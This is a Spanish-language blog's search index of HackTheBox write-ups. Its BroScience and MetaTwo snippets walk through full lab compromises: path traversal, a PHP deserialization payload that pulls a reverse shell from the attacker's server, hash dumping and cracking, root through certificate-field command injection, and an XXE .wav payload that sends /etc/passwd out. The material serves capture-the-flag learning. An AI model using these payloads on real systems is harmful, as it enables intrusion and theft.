[
  
  {
    "title": "Interface WriteUp",
    "url": "/posts/interface-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, medium, RCE",
    "date": "2023-03-31 18:00:00 +0200",
    





    "snippet": "Interface es una máquina de HackTheBox con una dificultad media. Para acceder usaremos una CVE de  la herramienta dompdf  que cuenta con un RCE y para la escalada nos aprovecharemos de una tarea cron que nos permite poner la bash con permiso SUID.EnumeraciónEscaneo de puertosEmpezamos con un escaneo nmap.❯ nmap 10.10.11.200Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-01 00:29 -04Nmap scan report for prd.m.rendering-api.interface.htb (10.10.11.200)Host is up (0.16s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 2.62 secondsSi intentamos ver la página webSitio en manteniminetoSi aplicamos fuzzing no encontramos nada, así que probaremos con burpsuite_Burp SuiteSi agregamos ese dominio al /etc/passwdecho '10.10.11.200       http://prd.m.rendering-api.interface.htb'  | tee -a /etc/hostsSi le aplicamos un curl nos dira que el código de estado es 404.❯ curl -i http://prd.m.rendering-api.interface.htbHTTP/1.1 404 Not FoundServer: nginx/1.14.0 (Ubuntu)Date: Sat, 01 Apr 2023 04:49:09 GMTContent-Type: text/html; charset=UTF-8Transfer-Encoding: chunkedConnection: keep-aliveFile not found.Aplicamos Fuzzing.❯ wfuzz -c  --hh=182 -t 300 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://prd.m.rendering-api.interface.htb/FUZZ 2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://prd.m.rendering-api.interface.htb/FUZZTotal requests: 220547=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000001467:   403        1 L      2 W        15 Ch       \"vendor\"                                                                                                               IntrusiónCVE-2022-28368Escalada de privilegios"
  },
  
  {
    "title": "Agile WriteUp",
    "url": "/posts/agile-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy",
    "date": "2023-03-31 18:00:00 +0200",
    





    "snippet": ""
  },
  
  {
    "title": "Flight WriteUp",
    "url": "/posts/fligth-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-23 17:00:00 +0100",
    





    "snippet": "Proximamente…"
  },
  
  {
    "title": "Stocker WriteUp",
    "url": "/posts/stocker-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-23 17:00:00 +0100",
    





    "snippet": "Proximamente…Sale muy pronto"
  },
  
  {
    "title": "Soccer WriteUp",
    "url": "/posts/soccer-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-23 17:00:00 +0100",
    





    "snippet": "Proximamente…Sale proximante por el 12 -30 de abril…"
  },
  
  {
    "title": "Investigation WriteUp",
    "url": "/posts/investigation-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-22 17:00:00 +0100",
    





    "snippet": "Proximamente…"
  },
  
  {
    "title": "BroScience WriteUp",
    "url": "/posts/broscience-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "medium, linux, writeup, hackthebox, directory transversal, SSL certificate, cookie, Postgresql",
    "date": "2023-03-21 17:00:00 +0100",
    





    "snippet": "Tocaremos una máquina media de HackTheBox. Cuando creemos una cuenta nos pedirá una clave de activación, gracias a una vulnerabilidad de directory transversal podremos ver una manera de conseguir el código para activar la cuenta con una función de tiempo al momento crear la cuenta. Para ganar acceso al sistema nos aprovecharemos de un vulnerabilidad en una clase de PHP que nos lanzará la shell como www-data. Con una base de datos de Postgresql podremos sacar la contraseña del usuario Bill y para la escalada nos aprovecharemos de una tarea cron que verifica el estado del certificado SSL.Escaneo NMAPRealizamos un escaneo NMAP.❯ nmap 10.10.11.195Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 16:46 -04Nmap scan report for 10.10.11.195Host is up (0.16s latency).Not shown: 997 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http443/tcp open  httpsNmap done: 1 IP address (1 host up) scanned in 2.32 secondsAnalizando la WebWebEn el sertificado SSL encontramos un correo.            administratror@broscience.htb      Si miramos vemos que podemos logearnos y crear una cuenta.Crear CuentaUna vez creada  vemos esto:Confrim CodeSi intentamos logiarnos, nos dirá que la cuenta no está activada todavía.ErrorEscaneando directorios vemos cosas ineresantes.❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://10.10.11.195/FUZZ 2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: https://10.10.11.195/FUZZTotal requests: 220547=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000002:   301        9 L      28 W       315 Ch      \"images\"                                                                                                               000000624:   301        9 L      28 W       317 Ch      \"includes\"                                                                                                             000000716:   301        9 L      28 W       315 Ch      \"manual\"                                                                                                               000001059:   301        9 L      28 W       319 Ch      \"javascript\"                                                                                                           000001703:   301        9 L      28 W       315 Ch      \"styles\"                                                                                                               Total time: 90.60100Processed Requests: 10082Filtered Requests: 10077Requests/sec.: 111.2791Nmap done: 1 IP address (1 host up) scanned in 2.32 secondsIncludesLa ruta /includes nos llama la atención. Déspues de probar todos el unicó que nos llama la atención es  /img.php.img.phpSi intentamos un directory transversal veremos esto:img.phpBYPASSYNG: Con doble URL ENCODEProbando varios metodos de ofuscación me di cuenta que la barra entra en conflicto, ¿Cómo se soluciona?, bueno podemos aplicar doble URL encodeExelente pregunta, les daré una breve explicacíon: By ChatGPT  Cuando se realiza una codificación de URL, algunos caracteres especiales se reemplazan por secuencias de escape que comienzan con el signo % seguido de un código hexadecimal. Por ejemplo, el caracter / se codifica como %2f.Si se tiene una cadena que ya ha sido codificada previamente y se desea codificarla nuevamente, se debe codificar cada uno de los caracteres que representan los caracteres especiales. En este caso, el % se codifica como %25, y luego el caracter / se codifica como %2f, resultando en la cadena %252f.Sabiendo eso podemos inntear leer el /etc/password podemos usar curl o BurpSuite.Doble URL ENCODEEn el reapeter apuntamos al /etc/passwd./etc/passwdAhora con curl.❯ curl -k 'https://10.10.11.195/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd'root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologintss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/falsemessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinusbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologinsshd:x:108:65534::/run/sshd:/usr/sbin/nologindnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinavahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologinspeech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/falsepulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologinsaned:x:113:121::/var/lib/saned:/usr/sbin/nologincolord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologinDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsebill:x:1000:1000:bill,,,:/home/bill:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinpostgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash_laurel:x:998:998::/var/log/laurel:/bin/falseDirectory TransversalAhora les comparto un script de bash que cree para ahorrar tiempo. Una vez clonado lo ejecutamos y tratamos de ver información de la página de login(login.php). Viendo el codigo del archivo PHP&lt;?phpsession_start();// Check if user is logged in alreadyif (isset($_SESSION['id'])) {    header('Location: /index.php');}// Handle a submitted log in formif (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {    // Check if variables are empty    if (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {            include_once 'includes/db_connect.php';                // Check if username:password is correct        $res = pg_prepare($db_conn, \"login_query\", 'SELECT id, username, is_activated::int, is_admin::int FROM users WHERE username=$1 AND password=$2');        $res = pg_execute($db_conn, \"login_query\", array($_POST['username'], md5($db_salt . $_POST['password'])));                if (pg_num_rows($res) == 1) {            // Check if account is activated            $row = pg_fetch_row($res);            if ((bool)$row[2]) {                // User is logged in                $_SESSION['id'] = $row[0];                $_SESSION['username'] = $row[1];                $_SESSION['is_admin'] = $row[3];                // Redirect to home page                header('Location: /index.php');            } else {                $alert = \"Account is not activated yet\";            }        } else {            $alert = \"Username or password is incorrect.\";        }    } else {        $alert = \"Please fill in both username and password.\";    }}?&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;BroScience : Log In&lt;/title&gt;        &lt;?php include_once 'includes/header.php'; ?&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;?php include_once 'includes/navbar.php'; ?&gt;        &lt;div class=\"uk-container uk-container-xsmall\"&gt;            &lt;form class=\"uk-form-stacked\" method=\"POST\" action=\"login.php\"&gt;                &lt;fieldset class=\"uk-fieldset\"&gt;                    &lt;legend class=\"uk-legend\"&gt;Log In&lt;/legend&gt;                    &lt;?php                    // Display any alerts                    if (isset($alert)) {                    ?&gt;                    &lt;div uk-alert class=\"uk-alert-&lt;?php if(isset($alert_type)){echo $alert_type;}else{echo 'danger';} ?&gt;\"&gt;                            &lt;a class=\"uk-alert-close\" uk-close&gt;&lt;/a&gt;                            &lt;?=$alert?&gt;                        &lt;/div&gt;                    &lt;?php                    }                    ?&gt;                    &lt;div class=\"uk-margin\"&gt;                        &lt;input name=\"username\" class=\"uk-input\" placeholder=\"Username\"&gt;                    &lt;/div&gt;                    &lt;div class=\"uk-margin\"&gt;                        &lt;input name=\"password\" class=\"uk-input\" type=\"password\" placeholder=\"Password\"&gt;                    &lt;/div&gt;                    &lt;div class=\"uk-margin\"&gt;                        &lt;button class=\"uk-button uk-button-default\" type=\"submit\"&gt;Log in&lt;/button&gt;                    &lt;/div&gt;                    &lt;div class=\"uk-margin\"&gt;                        &lt;a href=\"register.php\"&gt;Create an account&lt;/a&gt;                    &lt;/div&gt;                &lt;/fieldset&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;Viendo el código, intentamos ver el register.php viendo que no hay una ruta sabemos que se encuentra en en el mismo directorio, procedemos a leerlo sin problemas.RegistrerVemos como activar la cuenta.Activation CodeAl seguir analizando vemos que  llama  a includes/utils.php, procedemos a leerlo.Activation CodeSi lo leemos veremos esta función de PHP.FunctionActivando la cuentaNos creamos una cuenta y la interceptamos con BrupSuite, la mandamos al Reapeter la enviamos y copiamos la fecha.DateCon la función PHP ponemos nuestra fecha y nos dara el codigo, Creamos un archivo.php&lt;?phpfunction generate_activation_code() {    $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\";    srand(strtotime(\"Fri, 31 Mar 2023 20:59:29 GMT\"));    $activation_code = \"\";    for ($i = 0; $i &lt; 32; $i++) {        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];    }    echo $activation_code;}generate_activation_code()?&gt;Lo ejecutamos…❯ php code.phpHmKj5RgqljPy3516zxzpf2f5S2rBwzn9Copiamos el código y lo ingresamos en:  https://broscience.htb/activate.php?code=Iniciamos sesión y estamos adentro.H4CKED!!!Ganando accsesoRevisamos de nuevo el utils.php y vemos el siguiente codigo:class Avatar {    public $imgPath;    public function __construct($imgPath) {        $this-&gt;imgPath = $imgPath;    }    public function save($tmp) {        $f = fopen($this-&gt;imgPath, \"w\");        fwrite($f, file_get_contents($tmp));        fclose($f);    }}class AvatarInterface {    public $tmp;    public $imgPath;     public function __wakeup() {        $a = new Avatar($this-&gt;imgPath);        $a-&gt;save($this-&gt;tmp);    }}?&gt;La clase avatar tiene un parámetro imgPath que se usa para indicar la ruta de la imagen y un parámetro tmp abre la imagen y guarda su contenido en el servidor.La interfaz de avatar tiene un nombre de método/función __wakeup()que crea una nueva instancia de clase de avatar y un método de guardado de clase para la clase de avatar.Entonces, en teoría, si pudiéramos establecer la ruta img en nuestro servidor y hacer que reciba un shell PHP, la ruta tmp lo almacenará en el servidor y podríamos activar un shell inverso después de activarlo.Utils.php modificadoLo ejecutamos..❯ php utils-avatar.phpTzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE0LjUwL3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3NoZWxsLnBocCI7fQ==Usando un CookieEditor lo copiamos y lo introducimos en donde dice  user-prefs.CookieNos creamos una una reverse-shell.php con ese nombre y abrimos un servidor python.python -m http.server 80Y nustro Listenig….nc -lvnp 443En el navegador hacemos referencia a ese archivo y Pwned!!!.  Recuerda aplicar el Tratamiento a la TTY  ❯ nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.50] from (UNKNOWN) [10.10.11.195] 35568Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux 19:08:51 up 18:09,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)bash: cannot set terminal process group (1230): Inappropriate ioctl for devicebash: no job control in this shellwww-data@broscience:/$   PWNED!!!Migrando de WWW-DATA a BillSi se acuerdan de la carpata includes había una archivo db_connect.php, lo miramos.www-data@broscience:/var/www/html$ ls includes/db_connect.php\theader.php  img.php  navbar.php  utils.phpwww-data@broscience:/var/www/html$ cat includes/db_connect.php &lt;?php$db_host = \"localhost\";$db_port = \"5432\";$db_name = \"broscience\";$db_user = \"dbuser\";$db_pass = \"RangeOfMotion%777\";$db_salt = \"NaCl\";$db_conn = pg_connect(\"host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}\");if (!$db_conn) {    die(\"&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database\");}Vemos claves para una Base de Datos, pero mysql no esta instalado. Pero… vemos un puerto. Buscando en Google vemos que se tratat de postgresql. Usando este blog nos enseñan a conectarnos.www-data@broscience:/var/www/html/includes$ psql -h localhost -p 5432 -d broscience -U dbuser -WPassword: RangeOfMotion%777psql (13.9 (Debian 13.9-0+deb11u1))SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)Type \"help\" for help.broscience=&gt; Mostramos las tablas disponibles.broscience-&gt; \\dt           List of relations Schema |   Name    | Type  |  Owner   --------+-----------+-------+---------- public | comments  | table | postgres public | exercises | table | postgres public | users     | table | postgres(3 rows)Mostramos la data de la tablaoscience=&gt; select * from users; id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          ----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04  6 | mrt420        | 71d63fd0df7f8fb5e5121cbad6754799 | mrt420@mrt.com               | 3SdFiMzFushSzTBvEgP85atGTRBWH9r9 | f            | f        | 2023-03-31 19:32:22.994831-04(6 rows)broscience=&gt; Copiamos los nombres y los hashes MD5. Con ayuda de REGEX podemos darle el formato apropiadocat hash  | sed -E 's/^(\\w+)\\s*\\|\\s*(\\w+)$/\\1:\\2/' &gt; hashsEl hash esta salado, hacemos lo siguiente15657792073e8a843d4f91fc403454e1:NaCl13edad4932da9dbb57d9cd15b66ed104:NaClbd3dad50e2d578ecba87d5fa15ca5f85:NaCla7eed23a7be6fe0d765197b1027453fe:NaCl5d15340bded5b9395d5d14b9c21bc82b:NaCl71d63fd0df7f8fb5e5121cbad6754799:NaClAhora necesitamos el modo correcto, les comparto la siguiente wiki.❯ hashcat -m 20 hashs /usr/share/wordlists/rockyou.txtEn un momento tendremos las contraseñas.PWNED!!!Migramos…su billbill@broscience:~$ cat user.txt be****************************50bill@broscience:~$ Tenemos la priemra flag!Escalada de privilegiosUsando pspy64 para ver procesos de root. Encontramos lo siguiente.PsPyleyendo el contenido nos encontramos con un script de bash.bill@broscience:~$ cat /opt/renew_cert.sh#!/bin/bashif [ \"$#\" -ne 1 ] || [ $1 == \"-h\" ] || [ $1 == \"--help\" ] || [ $1 == \"help\" ]; then    echo \"Usage: $0 certificate.crt\";    exit 0;fiif [ -f $1 ]; then    openssl x509 -in $1 -noout -checkend 86400 &gt; /dev/null    if [ $? -eq 0 ]; then        echo \"No need to renew yet.\";        exit 1;    fi    subject=$(openssl x509 -in $1 -noout -subject | cut -d \"=\" -f2-)    country=$(echo $subject | grep -Eo 'C = .{2}')    state=$(echo $subject | grep -Eo 'ST = .*,')    locality=$(echo $subject | grep -Eo 'L = .*,')    organization=$(echo $subject | grep -Eo 'O = .*,')    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')    commonName=$(echo $subject | grep -Eo 'CN = .*,?')    emailAddress=$(openssl x509 -in $1 -noout -email)    country=${country:4}    state=$(echo ${state:5} | awk -F, '{print $1}')    locality=$(echo ${locality:3} | awk -F, '{print $1}')    organization=$(echo ${organization:4} | awk -F, '{print $1}')    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')    echo $subject;    echo \"\";    echo \"Country     =&gt; $country\";    echo \"State       =&gt; $state\";    echo \"Locality    =&gt; $locality\";    echo \"Org Name    =&gt; $organization\";    echo \"Org Unit    =&gt; $organizationUnit\";    echo \"Common Name =&gt; $commonName\";    echo \"Email       =&gt; $emailAddress\";    echo -e \"\\nGenerating certificate...\";    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;\"$country    $state    $locality    $organization    $organizationUnit    $commonName    $emailAddress    \" 2&gt;/dev/null    /bin/bash -c \"mv /tmp/temp.crt /home/bill/Certs/$commonName.crt\"else    echo \"File doesn't exist\"    exit 1;¿Qué hace este scrript?  ChatGPT: Este script es un archivo de shell (bash) que automatiza la renovación de un certificado de seguridad SSL/TLS en un servidor web mediante el uso de OpenSSL. A continuación, se explican las partes del código:La primera sección del código verifica si el script se ejecuta con un solo argumento que es el archivo de certificado que se va a renovar. Si el usuario proporciona más de un argumento o proporciona una opción de ayuda, se muestra un mensaje de uso y se sale del script.La segunda sección del código comprueba si el archivo de certificado especificado existe. Si existe, se utiliza OpenSSL para verificar la fecha de vencimiento del certificado. Si el certificado no ha caducado todavía, se muestra un mensaje y se sale del script. De lo contrario, se extraen los detalles del sujeto del certificado y se muestran en la salida.La tercera sección del código genera un nuevo certificado autofirmado con la misma información del sujeto que se extrajo del certificado anterior. El nuevo certificado se guarda en un directorio específico y se nombra después del nombre común del sujeto. El certificado anterior se reemplaza por el nuevo certificado recién generado.En resumen, el script automatiza la renovación de un certificado SSL/TLS para un servidor web. Si el certificado existente está a punto de caducar, el script genera un nuevo certificado autofirmado y lo reemplaza en el servidor.Generamos un certificado SSL con el mismo nombre y le injectamos codigo malicioso.openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/ Certificados/broscience.crt -días 1Nos debería quedar así.bill@broscience:~$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days 1Generating a RSA private key....................................................................................++++.............................++++writing new private key to '/home/bill/Certs/broscience.key'-----You are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter '.', the field will be left blank.-----Country Name (2 letter code) [AU]:State or Province Name (full name) [Some-State]:Locality Name (eg, city) []:Organization Name (eg, company) [Internet Widgits Pty Ltd]:Organizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:$(chmod +x /bin/bash)En unos minutos nuestra bash será SUID.bill@broscience:~/Certs$ ls -la /bin/bash-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bashHacemos lo siguiente:bill@broscience:~/Certs$ bash -pbash-5.1# whoamirootbash-5.1# Procedemos a leer la flagbash-5.1# cat /root/root.txtda****************************8ebash-5.1# RootedEsa fue la máquina de hoy, ¡Feliz Hackeo!"
  },
  
  {
    "title": "EscapeWriteUp",
    "url": "/posts/escape-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "windows, hackthebox, writeup, medium",
    "date": "2023-03-20 17:00:00 +0100",
    





    "snippet": ""
  },
  
  {
    "title": "MetaTwo WriteUp",
    "url": "/posts/metatwo-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy, wordpress, sql injection, virtual hosting, LFI, XSS",
    "date": "2023-03-20 17:00:00 +0100",
    





    "snippet": "Hoy toca compremeter la máquina MetaTwo de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de  Word Press, usando dicha vulnerabilidad podemos dumpear la base de datos y obtener el Usuario y la contraseña del usuario de Word Press,EnumeraciónIdentificando el OSEnviando trazas ICMP  (Internet Control Message Protocol) y usando el TTL(Time to Live) podemos identificar el OS.❯ ping -c1 10.10.11.186PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=156 ms--- 10.10.11.186 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 156.106/156.106/156.106/0.000 msNMAPSi realizamos un escaneo de puertos, encontramos:❯ nmap 10.10.11.186Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 12:53 -04Nmap scan report for 10.10.11.186Host is up (0.21s latency).Not shown: 997 closed tcp ports (reset)PORT   STATE SERVICE21/tcp open  ftp22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 16.43 secondsAnalizando la WebSi intentamos acceder a la web, nos redirige, para solucionar esto hacemos:echo '10.10.11.186   metapress.htb' | tee -a /etc/hostsCone esto arreglamos el problema de virtual hosting.Websi ingresamos a la direcciñon que nos muestra vemos esto:EventsCVE-2022-0739Si miramos el código fuente vemos que usa el plugin booking-press v1.0.10 con una importante (CVE))[https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357] si buscamos un exploit para esa versión, encontramos este y este otro.Creamos un evnto y en todos los campos de texto colocamos bookingpress_form.BookingPressAhora vemos el código fuente y buscamos por once y copiamos ese pin. Con el exploit que les compartí podemos dumpear la base de datos.❯ python3 exploit.py -u http://metapress.htb -n 30594111b0- BookingPress PoC-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1-- Count of users:  2|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.||manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|Ahora copiamos el hash y lo intentamos crakear con john.❯ john -w:/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])Cost 1 (iteration count) is 8192 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuspartylikearockstar (manager)1g 0:00:00:03 DONE (2023-03-24 14:36) 0.2617g/s 28950p/s 28950c/s 28950C/s poochini..music69Use the \"--show --format=phpass\" options to display all of the cracked passwords reliablySession completedPodemos autenticarnos con Word Press.Comprometiendo la máquinaAccedemos al panel de WordPress.WP LoginSi iniciamos sesión podemos ver la versión del CMS de WordPress.WP CMSCVE-2021-29447Encontramos una manera de subir archivos multimedia.WAVExiste una sala de (TryHackMe)[https://tryhackme.com/room/wordpresscve202129447] que nos enseñan esta vulnerabilidad. Creamos un archivo .dtd que intente leer el el /etc/passwd convirtiendo la data en formato base64 y reciviendola con una petición GET en nuestro servidor.Archivo .wav, recuerda cambiar tu IP de la VPN de HackTheBox.❯ echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.36/exploit.dtd'\"'\"'&gt;%remote;%init;%trick;]&gt;\\x00' &gt; pwned.wavNuestro archivo exploit.dtd le puedes llamar a tu gusto, pero recuerda cambiar la petición.❯ cat exploit.dtd&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.36/?p=%file;'&gt;\" &gt;Nos creamos un servidor PHP por el puerto 80 y observamos el resultado.php -S 0.0.0.0:80Base64Bingo!, podemos leer el /etc/hosts❯ echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1